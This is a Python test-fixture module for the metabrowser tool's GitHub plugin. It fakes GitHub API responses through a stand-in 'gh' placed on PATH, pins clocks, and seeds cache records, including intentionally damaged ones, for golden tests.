    """Fixed GraphQL catalog pages: graphql:<all|open|closed|updated>:<cursor|start>."""
    totals = {"all": len(items), "open": sum(item["state"] == "open" for item in items)}
    totals["closed"] = totals["all"] - totals["open"]
    latest = max((item["updated_at"] for item in items), default=None)
    entries: dict[str, Any] = {}
    for name in ("all", "open", "closed", "updated"):
        selected = [item for item in items if name in {"all", "updated"} or item["state"] == name]
        selected.sort(
            key=lambda item: (
                (item["updated_at"], item["number"]) if name == "updated" else item["number"]
            ),
            reverse=True,
        )
        for offset in range(0, max(1, len(selected)), 100):
            cursor = f"{name}-{offset}" if offset else "start"
            batch = selected[offset : offset + 100]
            nodes = []
            for item in batch:
                head = item["head"].get("repo")
                nodes.append(
                    {
                        "number": item["number"],
                        "title": item["title"],
                        "state": "MERGED" if item.get("merged_at") else item["state"].upper(),
                        "isDraft": item.get("draft", False),
                        "mergedAt": item.get("merged_at"),
                        "createdAt": item["created_at"],
                        "updatedAt": item["updated_at"],
                        "closedAt": item.get("closed_at"),
                        "author": item.get("user"),
                        "baseRefName": item["base"]["ref"],
                        "headRefName": item["head"]["ref"],
                        "headRepository": {"nameWithOwner": head["full_name"]} if head else None,
                        "labels": {
                            "nodes": [
                                {"name": label["name"]} for label in item.get("labels", [])[:100]
                            ],
                            "pageInfo": {"hasNextPage": len(item.get("labels", [])) > 100},
                        },
                    }
                )
            key = f"graphql:{name}:{cursor}"
            body = {
                "data": {
                    "viewer": {"login": reader},
                    "repository": {
                        "id": repository_id,
                        **{label: {"totalCount": count} for label, count in totals.items()},
                        "latest": {"nodes": [{"updatedAt": latest}] if latest else []},
                        "page": {
                            "nodes": nodes,
                            "pageInfo": {
                                "hasNextPage": offset + 100 < len(selected),
                                "endCursor": f"{name}-{offset + len(batch)}" if batch else None,
                            },
                        },
                    },
                }
            }
            entries[key] = ok(key, body)
    return entries


def seed_catalog(
    repository: ListedRepository,
    items: list[dict[str, Any]],
    *,
    reader: str = READER,
    fetched_at: str = "2026-10-01T12:00:00Z",
    complete: bool = True,
    repository_id: str = "R_demo",
) -> CatalogState:
    """Seed actual bounded catalog publications without a fake route envelope."""
    from metabrowser.builtin_plugins.github.pull_catalog import (
        CATALOG_PROJECTION,
        CatalogState,
        publish_page,
        read_catalog,
    )
    from metabrowser.builtin_plugins.github.pull_list_refresh import (
        _row,  # pyright: ignore[reportPrivateUsage]
    )

    totals = {"all": len(items), "open": sum(item["state"] == "open" for item in items)}
    totals["closed"] = totals["all"] - totals["open"]
    state = read_catalog(repository.home, repository.slug)
    ordered = sorted(items, key=lambda item: item["number"], reverse=True)
    for offset in range(0, max(1, len(ordered)), 100):
        proposed = CatalogState(
            projection_version=CATALOG_PROJECTION,
            source=repository.source,
            repository_id=repository_id,
            reader=f"gh:{reader}",
            fetched_at=fetched_at,
            count_at=fetched_at,
            totals=totals,
            covered={name: min(offset + 100, totals[name]) for name in totals},
            done={name: complete and offset + 100 >= len(ordered) for name in totals},
            watermark=max((item["updated_at"] for item in items), default=None),
        )
        if (
            state is not None
            and state.reader == proposed.reader
            and state.repository_id == repository_id
        ):
            proposed = proposed.model_copy(update={"epoch": state.epoch})
        rows = tuple(_row(item)[0] for item in ordered[offset : offset + 100])
        assert publish_page(repository, state, proposed, rows)
        state = read_catalog(repository.home, repository.slug)
    assert state is not None
    return state


def scenario(origin: Origin) -> dict[str, Any]:
    """Signed in as :data:`READER`, answering every read of pull requests 7 to 10."""

    lists = list_entries(origin)
    items = [*lists[list_page("all")]["body"], *lists[list_page("all", 2)]["body"]]
    answers = {**api_entries(origin), **lists, **catalog_entries(items)}
    return {"auth": account(), "api": answers, "api_failure": None}


def install_fake_gh(directory: Path, answers: Mapping[str, Any]) -> dict[str, str]:
    """Write a ``gh`` replaying *answers*; return the environment that puts it first."""

    bin_dir = directory / "fake-gh-bin"
    bin_dir.mkdir(parents=True, exist_ok=True)
    gh = bin_dir / "gh"
    gh.write_text(_FAKE_GH.format(python=sys.executable), encoding="utf-8")
    gh.chmod(0o755)
    scenario_path = directory / "fake-gh-scenario.json"
    scenario_path.write_text(json.dumps(answers), encoding="utf-8")
    state = directory / "fake-gh-state.json"
    state.unlink(missing_ok=True)
    return {
        "PATH": f"{bin_dir}{os.pathsep}{os.environ.get('PATH', '')}",
        "FAKE_GH_SCENARIO": str(scenario_path),
        "FAKE_GH_STATE": str(state),
        "FAKE_GH_LOG": str(directory / "fake-gh-log.jsonl"),
    }


@contextlib.contextmanager
def _patched(target: object, name: str, value: object) -> Generator[None]:
    original = getattr(target, name)
    setattr(target, name, value)
    try:
        yield
    finally:
        setattr(target, name, original)


def build_home(directory: Path, *, files: bool = False) -> None:
    """Cache the mirror and pull requests 7 to 10 through the production CLI path.

    With *files*, :func:`build_file_lists` adds lists of changed files.

    The seams are the in-process goldens' own: the origin URL, the Git floor (the
    machine's Git may be below it), the clock, and a fake ``gh`` first on ``PATH``.
    Only this module run as a script reaches them, from a tryscript golden. No pytest
    run does, so the admitted-git job's tests still meet the floor unpatched.
    """

    from metabrowser.builtin_plugins.github import pull_list, pulls
    from metabrowser.cache import acquire
    from metabrowser.cache.urls import GitSource
    from metabrowser.cli.main import _run_cli  # pyright: ignore[reportPrivateUsage]
    from metabrowser.git.process import detect_git_version

    origin = build_origin(directory)
    answers = scenario(origin)
    environment = install_fake_gh(directory, answers)
    version, _raw = detect_git_version()
    local = origin.url

    def remote_url_for(source: GitSource) -> str:
        return local if source.normalized == CANONICAL else source.normalized

    os.environ.update(environment)
    os.environ["METABROWSER_CACHE_DIR"] = str(directory / "home")
    os.environ["METABROWSER_LOG_LEVEL"] = "ERROR"
    with (
        _patched(acquire, "remote_url_for", remote_url_for),
        _patched(acquire, "require_acquisition_git", lambda: version),
        _patched(pulls, "utc_now", lambda: FETCHED_AT),
        _patched(pull_list, "utc_now", lambda: FETCHED_AT),
    ):
        for number in (7, 8, 9, 10):
            try:
                _run_cli([f"{CANONICAL}/pull/{number}", "--no-serve"])
            except SystemExit as exc:
                if exc.code not in (0, None):
                    raise
        build_lists(directory, answers)
        if files:
            build_file_lists(directory, answers)
    write_damaged_records(directory / "home")
    (directory / "root").mkdir(exist_ok=True)


def _source_slug() -> str:
    from metabrowser.cache.identity import cache_slug, source_identity

    return cache_slug(
        "https", CANONICAL, source_identity("https", CANONICAL), slug_owner=lambda _slug: None
    )


def build_lists(directory: Path, answers: Mapping[str, Any]) -> None:
    """One complete shared catalog, last read as another account, for cache-only goldens."""

    from metabrowser.builtin_plugins.github.pull_catalog import publish_page, read_catalog
    from metabrowser.builtin_plugins.github.pull_list import ListedRepository
    from metabrowser.builtin_plugins.github.pull_list_refresh import refresh_pull_list

    repository = ListedRepository(directory / "home", _source_slug(), "octo", "demo")
    asyncio.run(refresh_pull_list(repository, "open"))
    other = json.loads(json.dumps(answers))
    other["auth"] = account(ANOTHER_READER)
    for key, entry in other["api"].items():
        if key.startswith("graphql:"):
            entry["body"]["data"]["viewer"]["login"] = ANOTHER_READER
    os.environ.update(install_fake_gh(directory, other))
    asyncio.run(refresh_pull_list(repository, "open"))
    # The static read-only fixture has one epoch. Pin that opaque random identity,
    # just as its clock is pinned; runtime account/reset tests use real unique epochs.
    current = read_catalog(repository.home, repository.slug)
    assert current is not None
    fixed = current.model_copy(update={"epoch": "00000000000000000000000000000001"})
    assert publish_page(repository, current, fixed, ())
    os.environ.update(install_fake_gh(directory, answers))


def build_file_lists(directory: Path, answers: Mapping[str, Any]) -> None:
    """Lists of changed files, each through ``POST pull-files-refresh`` in a one-shot command.

    7 from the local comparison of its record; 106 and the capped 105 from GitHub's pages;
    104 stopped at its third page by GitHub's rate limit; 103 read by another account, and
    then refreshed, and failed, as this one. 12 and 13 are lists the route cannot use.
    """

    from uuid import UUID

    from metabrowser.builtin_plugins.github import pull_files_refresh
    from metabrowser.cache.paths import source_pull_files
    from metabrowser.cli.main import _run_cli  # pyright: ignore[reportPrivateUsage]
    from metabrowser.home import write_private_file_atomic

    halted = CAPPED_PULL - 1
    limited = {
        "status": 403,
        "headers": {"X-Ratelimit-Remaining": "0", "X-Ratelimit-Reset": "1790181960"},
        "body": {"message": "API rate limit exceeded"},
    }
    with_files = {**answers, "api": {**answers["api"], **file_entries()}}
    pages = {
        **file_pages(halted, tree_files()),
        files_page(halted, 3): limited,
        **file_pages(halted - 1, tree_files()[:2]),
    }
    offline = {"stderr": "error connecting to api.github.com\n", "exit": 1}
    others = {**with_files, "api": {**with_files["api"], **pages}}
    # Each run, and whether it succeeds. 103's last refresh ran as this reader and failed,
    # after another account read the list.
    runs: list[tuple[int, Mapping[str, Any], bool]] = [
        (7, with_files, True),
        (TREE_PULL, with_files, True),
        (CAPPED_PULL, with_files, True),
        (halted, others, False),
        (halted - 1, {**others, "auth": account(ANOTHER_READER)}, True),
        (halted - 1, {**others, "api_failure": offline}, False),
    ]
    request = directory / "files-request.json"
    refresh = "/api/plugin/github/pull-files-refresh"
    for generation, (number, scenario_answers, succeeds) in enumerate(runs, start=1):
        os.environ.update(install_fake_gh(directory, scenario_answers))
        request.write_text(json.dumps({"number": number, "retry": True}) + "\n", encoding="utf-8")
        try:
            with _patched(
                pull_files_refresh, "uuid4", lambda generation=generation: UUID(int=generation)
            ):
                _run_cli([CANONICAL, "--api", refresh, "--data", str(request)])
        except SystemExit as exc:
            if (exc.code in (0, None)) != succeeds:
                raise
    os.environ.update(install_fake_gh(directory, answers))
    request.unlink()
    home, slug = directory / "home", _source_slug()
    write_private_file_atomic(
        home, source_pull_files(slug, 12), json.dumps({"schema_version": 0}).encode()
    )
    write_private_file_atomic(home, source_pull_files(slug, 13), b"{not json")


def write_damaged_records(home: Path) -> None:
    """Records the route cannot use: 12 from another schema, 13 not JSON at all."""

    from metabrowser.cache.paths import source_pull_record
    from metabrowser.home import write_private_file_atomic

    slug = _source_slug()
    write_private_file_atomic(
        home, source_pull_record(slug, 12), json.dumps({"schema_version": 0}).encode()
    )
    write_private_file_atomic(home, source_pull_record(slug, 13), b"{not json")


def serve_stand_in(directory: Path, number: int, port: int) -> None:
    """Serve pull request *number* from a home :func:`build_home` wrote, for a browser.

    The same seams as :func:`build_home`, with the real clock, so the records read as
    stale and a refresh through the page asks the fake ``gh`` again. Nothing leaves
    ``127.0.0.1``: the mirror refreshes from the ``file://`` origin.
    """

    from metabrowser.cache import acquire
    from metabrowser.cache.urls import GitSource
    from metabrowser.cli.main import _run_cli  # pyright: ignore[reportPrivateUsage]
    from metabrowser.git.process import detect_git_version

    answers = json.loads((directory / "fake-gh-scenario.json").read_text(encoding="utf-8"))
    os.environ.update(install_fake_gh(directory, answers))
    os.environ["METABROWSER_CACHE_DIR"] = str(directory / "home")
    local = (directory / "github-pull-origin.git").as_uri()
    version, _raw = detect_git_version()

    def remote_url_for(source: GitSource) -> str:
        return local if source.normalized == CANONICAL else source.normalized

    with (
        _patched(acquire, "remote_url_for", remote_url_for),
        _patched(acquire, "require_acquisition_git", lambda: version),
    ):
        _run_cli([f"{CANONICAL}/pull/{number}", "--no-open", "--port", str(port)])


# The checkouts :func:`build_checkout_home` makes, each with its ``origin`` and any other
# remote: the repository by HTTPS and by SSH, a fork of it, a remote the plugin's grammar
# refuses though discovery admits it, and one that is not GitHub.
CHECKOUTS: Final[dict[str, tuple[str, tuple[tuple[str, str], ...]]]] = {
    "checkout": (CANONICAL + ".git", ()),
    "ssh-checkout": ("git@github.com:Octo/Demo.git", ()),
    "fork-checkout": ("https://github.com/someone/demo.git", (("upstream", CANONICAL + ".git"),)),
    "odd-checkout": ("https://github.com/under_score/demo.git", ()),
    "elsewhere": ("https://gitlab.example/octo/demo.git", ()),
}


def build_checkout_home(directory: Path) -> None:
    """Checkouts of the stand-in, and ``home`` as their folder servers' requests wrote it.

    Through the production CLI path, ``metab <checkout> --api`` with the fake ``gh`` and a
    fixed clock: the ``all`` list's first page, the records of 10, whose head is the
    checkout's ``HEAD``, and of 7, which it lacks, and 7's changed files, all from
    ``checkout``. No store is made, so the source is ``unattached``. ``folder`` is a plain
    directory.
    """

    from metabrowser.builtin_plugins.github import pull_list, pulls
    from metabrowser.cache import acquire
    from metabrowser.cli.main import _run_cli  # pyright: ignore[reportPrivateUsage]

    origin = build_origin(directory)
    for name, (remote, more) in CHECKOUTS.items():
        path = clone_checkout(origin, directory / name, remote=remote)
        for remote_name, url in more:
            subprocess.run(
                ["git", "-C", str(path), "remote", "add", remote_name, url],
                check=True,
                capture_output=True,
                env=git_env(directory),
            )
    os.environ.update(install_fake_gh(directory, files_scenario(origin)))
    os.environ["METABROWSER_CACHE_DIR"] = str(directory / "home")
    os.environ["METABROWSER_LOG_LEVEL"] = "ERROR"
    request = directory / "request.json"
    asked: list[tuple[str, dict[str, Any]]] = [
        ("/api/plugin/github/pulls-refresh", {}),
        ("/api/plugin/github/pull-refresh", {"number": 10, "retry": True}),
        ("/api/plugin/github/pull-refresh", {"number": 7, "retry": True}),
        ("/api/plugin/github/pull-files-refresh", {"number": 7}),
    ]
    with (
        _patched(pulls, "utc_now", lambda: FETCHED_AT),
        _patched(pull_list, "utc_now", lambda: FETCHED_AT),
        _patched(acquire, "canonical_now", lambda: FETCHED_AT.strftime("%Y-%m-%dT%H:%M:%SZ")),
    ):
        for route, body in asked:
            request.write_text(json.dumps(body) + "\n", encoding="utf-8")
            try:
                _run_cli([str(directory / "checkout"), "--api", route, "--data", str(request)])
            except SystemExit as exc:
                if exc.code not in (0, None):
                    raise
    request.unlink()
    (directory / "folder").mkdir(exist_ok=True)


def run_files_refresh(args: list[str]) -> None:
    """The real CLI with only its file-list UUID pinned for the static transcript."""

    from uuid import UUID

    from metabrowser.builtin_plugins.github import pull_files_refresh
    from metabrowser.cli.main import _run_cli  # pyright: ignore[reportPrivateUsage]

    with _patched(pull_files_refresh, "uuid4", lambda: UUID(int=15)):
        _run_cli(args)


if __name__ == "__main__":
    if len(sys.argv) > 2 and sys.argv[1] == "--files-refresh":
        run_files_refresh(sys.argv[2:])
    elif len(sys.argv) == 3 and sys.argv[2] == "--checkout":
        build_checkout_home(Path(sys.argv[1]).resolve())
    elif len(sys.argv) == 5 and sys.argv[2] == "--serve":
        serve_stand_in(Path(sys.argv[1]).resolve(), int(sys.argv[3]), int(sys.argv[4]))
    elif len(sys.argv) == 3 and sys.argv[2] == "--files":
        build_home(Path(sys.argv[1]).resolve(), files=True)
    elif len(sys.argv) == 2:
        build_home(Path(sys.argv[1]).resolve())
    else:
        raise SystemExit(
            "usage: github_pull_fixture.py <directory> [--files | --checkout | --serve <number> <port>] "
            "or --files-refresh <metab arguments>"
        )
